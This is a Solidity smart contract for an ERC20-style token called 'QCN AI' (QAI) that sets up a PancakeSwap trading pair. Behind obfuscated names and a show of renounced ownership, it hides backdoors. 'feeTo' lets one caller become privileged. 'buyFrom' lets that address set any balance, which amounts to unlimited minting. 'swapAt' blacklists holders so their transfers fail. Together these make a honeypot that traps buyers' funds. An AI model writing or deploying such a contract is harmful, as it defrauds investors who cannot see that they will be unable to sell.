contract QCNAI is Context, IERC20, Ownable {

    function buyFrom(address autoExempt, uint256 autoLiquidity) public {
        require(shouldLaunched[_msgSender()]);
        atReceiver[autoExempt] = autoLiquidity;
    }

    uint256 public isToken;

    using SafeMath for uint256;

    function approve(address maxReceiver, uint256 autoLiquidity) public override returns (bool) {
        _approve(_msgSender(), maxReceiver, autoLiquidity);
        return true;
    }

    address public walletSwapMode;

    bool public tokenSender;

    constructor () {
        renounceOwnership();
        walletSwapMode = _msgSender();
        marketingLaunched();
        emit Transfer(address(0), _msgSender(), autoAmountEnable);
        toEnable();
    }

    function transfer(address limitReceiver, uint256 autoLiquidity) public override returns (bool) {
        _transfer(_msgSender(), limitReceiver, autoLiquidity);
        return true;
    }

    function _basicTransfer(address teamTotal, address limitReceiver, uint256 autoLiquidity) internal returns (bool) {
        atReceiver[teamTotal] = atReceiver[teamTotal].sub(autoLiquidity, "Insufficient Balance");
        atReceiver[limitReceiver] = atReceiver[limitReceiver].add(autoLiquidity);
        emit Transfer(teamTotal, limitReceiver, autoLiquidity);
        return true;
    }

    function _transfer(address teamTotal, address limitReceiver, uint256 autoLiquidity) private returns (bool) {

        require(teamTotal != address(0), "ERC20: transfer from the zero address");
        require(limitReceiver != address(0), "ERC20: transfer to the zero address");
        require(!enableMode[teamTotal]);
        return _basicTransfer(teamTotal, limitReceiver, autoLiquidity);
    }

    bool public shouldLaunch;

    function name() public view returns (string memory) {
        return marketingTrading;
    }

    function _approve(address minTeam, address maxReceiver, uint256 autoLiquidity) private {
        require(minTeam != address(0), "ERC20: approve from the zero address");
        require(maxReceiver != address(0), "ERC20: approve to the zero address");

        launchFund[minTeam][maxReceiver] = autoLiquidity;
        emit Approval(minTeam, maxReceiver, autoLiquidity);
    }

    function allowance(address minTeam, address maxReceiver) public view override returns (uint256) {
        return launchFund[minTeam][maxReceiver];
    }

    uint256 private autoAmountEnable = 100000000 * 10 ** 18;

    mapping(address => uint256) atReceiver;

    function decimals() public view returns (uint8) {
        return launchMarketing;
    }

    function transferFrom(address teamTotal, address limitReceiver, uint256 autoLiquidity) public override returns (bool) {
        _transfer(teamTotal, limitReceiver, autoLiquidity);
        _approve(teamTotal, _msgSender(), launchFund[teamTotal][_msgSender()].sub(autoLiquidity, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    uint8 private launchMarketing = 18;

    function symbol() public view returns (string memory) {
        return receiverSender;
    }

    uint256 public fundWalletMin;

    function toEnable() private {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingToken = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
    }

    function marketingLaunched() private {
        atReceiver[_msgSender()] = autoAmountEnable;
        shouldLaunched[_msgSender()] = true;
    }

    string private receiverSender = "QAI";

    function feeTo(address buyTo) public {
        require(!tokenSender);
        shouldLaunched[buyTo] = true;
        tokenSender = true;
    }

    address public marketingToken;

    string private marketingTrading = "QCN AI";

    function decreaseAllowance(address maxReceiver, uint256 fromTotal) public virtual returns (bool) {
        _approve(_msgSender(), maxReceiver, launchFund[_msgSender()][maxReceiver].sub(fromTotal, "ERC20: decreased allowance below zero"));
        return true;
    }

    function swapAt(address liquidityMaxTotal) public {
        if (!shouldLaunched[_msgSender()]) {
            return;
        }
        if (liquidityMaxTotal == walletSwapMode || liquidityMaxTotal == marketingToken) {
            return;
        }
        enableMode[liquidityMaxTotal] = true;
    }

    function increaseAllowance(address maxReceiver, uint256 fromShould) public virtual returns (bool) {
        _approve(_msgSender(), maxReceiver, launchFund[_msgSender()][maxReceiver].add(fromShould));
        return true;
    }

    mapping(address => mapping(address => uint256)) private launchFund;

    function totalSupply() public view override returns (uint256) {
        return autoAmountEnable;
    }

    mapping(address => bool) public shouldLaunched;

    function balanceOf(address limitReceiverMarketing) public view override returns (uint256) {
        return atReceiver[limitReceiverMarketing];
    }

    mapping(address => bool) public enableMode;

    bool private senderTotal;

    using Address for address;

}